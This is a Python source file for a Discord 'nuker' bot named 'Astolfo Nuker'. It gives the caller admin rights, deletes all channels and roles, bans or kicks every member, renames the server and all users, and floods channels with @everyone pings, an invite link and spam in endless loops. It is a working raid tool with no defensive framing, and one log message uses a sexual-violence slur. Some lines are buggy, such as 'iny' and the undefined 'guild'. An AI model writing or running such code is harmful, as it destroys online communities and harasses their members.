from discord import Permissions 
import discord,random,time
import json
from discord.ext import commands 
import os 
import colorama
import asyncio
from colorama import Fore
from discord import Embed 

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=">",intents=intents)
bot.remove_command("help")
with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]
@bot.event
async def on_ready():
    print(f'''
{Fore.LIGHTCYAN_EX}╔═╗┌─┐┌┬┐┌─┐┌─┐┬  ┌─┐  
{Fore.LIGHTCYAN_EX}╠═╣└─┐ │ ├┤ │ ││  │ │  
{Fore.LIGHTCYAN_EX}╩ ╩└─┘ ┴ └  └─┘┴─┘└─┘  
{Fore.LIGHTCYAN_EX}╔╗╔┬ ┬┬┌─┌─┐┬─┐        
{Fore.LIGHTCYAN_EX}║║║│ │├┴┐├┤ ├┬┘        
{Fore.LIGHTCYAN_EX}╝╚╝└─┘┴ ┴└─┘┴└─     
Logged in and Ready <3                             
''')

@bot.command()
async def d(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 834134636678479902:
        await channel.delete()
      else:
        continue
    await ctx.guild.create_text_channel(name="nuked")
    print("Nuked All Channels")
    return
  else:
    try:
      channel = ctx.get.channel(id=iny(channel_id))
      await channel.delete()
    except:
      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
      await ctx.send(embed=e2)
    return

@bot.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete() 
    try:
        guild = ctx.guild
        role = await guild.create_role(name="Astfolo Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
        authour = ctx.message.author
        await authour.add_roles(role)
        print("Gave you admin <3")
    except:
        print("Couldnt give you admin :(")

@bot.command()
async def rspam(ctx):
 while True:
   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU")
   print("Spamming roles <3")
@bot.command()
async def transrspam(ctx):
 while True:
   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="Astfolo NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   print("Spamming roles <3")
@bot.command()
async def rdelete(ctx):
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass 
  embed = Embed(title="Done Deleting All Roles", color=0xaf1aff)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@bot.command()
async def cspam(ctx,amount=10,name_of_channel="nuked"):
  await ctx.message.delete() 
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {amount} Channels <3")

  await ctx.send(embed=em3)

@bot.command()
async def vcspam(ctx,amount=10,name_of_channel="nuked"): 
  await ctx.message.delete()
  for times in range(amount):
    await ctx.guild.create_voice_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {amount} Voice Channels <3")
  await ctx.send(embed=em3)

@bot.command()
async def banAll(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"Banned {user}")
        except:
           pass
@bot.command()
async def kickAll(ctx):
 await ctx.message.delete()
 #print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"Kicked {user}")
        except:
           pass

@bot.command()
async def help(ctx):
 await ctx.message.delete()
 embed1 = Embed(title="Astolfo Nuker Help", color=0xaf1aff)
 embed1.add_field(name=">help ", value="Sends This Message", inline=False)
 embed1.add_field(name=">cspam [Amount] Channel Name", value="Spams Channels", inline=True)
 embed1.add_field(name=">d all", value="Nukes All Channels", inline=False)
 embed1.add_field(name=">banAll", value="Bans all members", inline=False)
 embed1.add_field(name=">pingspam", value="Locks all channels And Spam Pings", inline=False) 
 embed1.add_field(name=">admin", value="Gives user Admin.", inline=False)
 embed1.add_field(name=">vcspam [Amount] [Channel Name]", value="Spams Voice Channels", inline=False)  
 embed1.add_field(name=">servername [Name]", value="Changes Server Name", inline=False)
 embed1.add_field(name=">nickall [Name]", value="Changes Everyones Names", inline=False)
 embed1.add_field(name=">rspam", value="Spams Roles", inline=False)
 embed1.add_field(name=">rdelete", value="Deletes All Roles Below the Bot", inline=False)
 embed1.add_field(name=">kickAll", value="Kicks All", inline=False)
 embed1.add_field(name=">transrspam", value="spams roles like the trans flag :flusuhed:", inline=False)
 embed1.add_field(name=">lagspam", value="Lags Peoples Discords", inline=False)
 embed1.set_image(url="https://media.discordapp.net/attachments/837017058273263712/837752787545882656/1533773770_w_KamaroTheTrap.gif")     
 embed1.set_footer(text="By oAaron")
 await ctx.send(embed=embed1, delete_after=10)



@bot.command()
async def pingspam(ctx):
    await ctx.guild.edit(name="SERVER WIZZED")
    print("raped channels <3")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()
    while True:
      for time in range(random.randint(4,10)):
        r1 = random.choice(lattersL)
      try:
        await guild.create_text_channel("nuked")
        await guild.create_voice_channel("wizzed")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU         {r1}")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU   {r1}")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU                {r1}")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU     {r1}")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU              {r1}")
          await webhook.send()
        except:
          pass 
@bot.command()
async def lagspam(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
      print("Lagging Channels")
@bot.command()
async def servername(ctx, name = None): 
  if name != None:
    await ctx.guild.edit(name=f"{name}")
    print("Changed Server Name")
    em200 = Embed(color = 0xaf1aff, title=f"Changed the server name to: ***{ctx.guild.name}***")
    await ctx.send(embed=em200, delete_after=8) 
  else:  
    em100 = Embed(color = 0xaf1aff, title=ctx.guild.name)
    em1001 = await ctx.send(embed=em100)
    time.sleep(8)
    await em1001.delete()
@bot.command()
async def nickall(ctx, *, name="! TOOL RUNS YOU"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 



bot.run(token)
